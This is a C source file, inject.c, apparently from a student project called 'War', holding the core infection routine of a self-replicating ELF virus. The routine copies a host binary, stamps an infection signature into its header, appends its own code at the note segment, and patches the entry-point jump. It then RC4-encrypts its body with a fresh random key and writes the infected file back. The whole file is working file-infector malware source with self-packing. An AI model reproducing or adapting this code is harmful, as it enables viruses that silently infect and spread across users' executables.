/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   inject.c                                           :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: ddinaut <ddinaut@student.42.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/03/12 18:20:42 by ddinaut           #+#    #+#             */
/*   Updated: 2019/03/27 20:18:59 by ddinaut          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "war.h"

void		inject(t_data *data)
{
//	revert_two(&data->key, (char*)infect, (size_t)inject - (size_t)infect);
	update_two(&data->key, (char*)inject, (size_t)release - (size_t)inject);

	char de[] = "inject\n";
	_write(1, de, 7);

	if (data->context == false)
		goto ERR;

	data->context = false;
	int		size = data->virus.size + data->virus.note->p_offset;
	uint8_t	*map = _mmap(0, size, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);
	if (map == MAP_FAILED)
		goto ERR;

	register int	off = 0;
	register int	lim = 0;
	uint8_t			*dst = map;
	uint8_t			*src = data->bin.map;

	// step 1 : copy
	lim = data->virus.data->p_offset + data->virus.data->p_filesz;
	while (off < lim)
	{
		*dst++ = *src++;
		off++;
	}

	// step 2 : insert signature
	data->header = (Elf64_Ehdr*)map;
	*(uint32_t*)&data->header->e_ident[EI_PAD] = SIGNATURE;

	// step 3 : pad
	lim = data->virus.note->p_offset;
	while (off < lim)
	{
		*dst++ = 0;
		off++;
	}

	// step 4 : inject itself
	uint8_t *beg = (uint8_t*)start;
	for (register int i = 0 ; i < (int)data->virus.size ; i++)
	{
		*dst++ = *beg++;
		off++;
	}

	// step 5 : patch entrypoint
	dst -= ((size_t)end_of_data - (size_t)cypher_end);
	while (*dst != 0xe9)
		dst++;
	if ((void*)dst >= (void*)data->bin.map + data->bin.size)
		goto ERR;

	data->bin_entry = data->bin_entry - data->vrs_entry - (data->virus.size - ENTRY_OFF);
	if (_memcpy(dst + 1, &data->bin_entry, 4) != dst + 1)
		goto ERR;

	// step 6 : pack binary
   	dst = map + (data->virus.note->p_offset + ((size_t)cypher_beg - (size_t)start));
	if (generate_key((uint8_t*)data->cpr_key, KEY_SIZE) == false)
		goto ERR;

	/* for (int i = 0 ; i < KEY_SIZE ; i++) */
	/* 	printf("0x%x ", (uint8_t)data->cpr_key[i]); */
	/* printf("\n"); */

//	step 6.5 : patch n pack
	/* char *ptr = (char*)map + (data->virus.note->p_offset + 86); */
	/* for (int i = 0 ; i < 30 ; i++) */
	/* 	printf("0x%x ", (uint8_t)ptr[i]); */
	/* printf("\n"); */


	_memcpy(map + (data->virus.note->p_offset + KEY_SIZE), data->cpr_key, KEY_SIZE);
	_rc4((uint8_t*)data->cpr_key, KEY_SIZE, dst, (size_t)end_of_data - (size_t)cypher_beg);

	/* lim = (size_t)end_of_data - (size_t)cypher_beg; */
	/* for (register int i = 0 ; i < lim ; i++) */
	/* { */
	/* 	(*dst) ^= 0x42; */
	/* 	dst++; */
	/* } */

	// final : write
	_write(data->bin.fd, map, size);
	data->context = true;

ERR:
	_munmap(map, size);
//	revert_two(&data->key, (char*)release, (size_t)cypher_end  - (size_t)release);
	release(data);
}
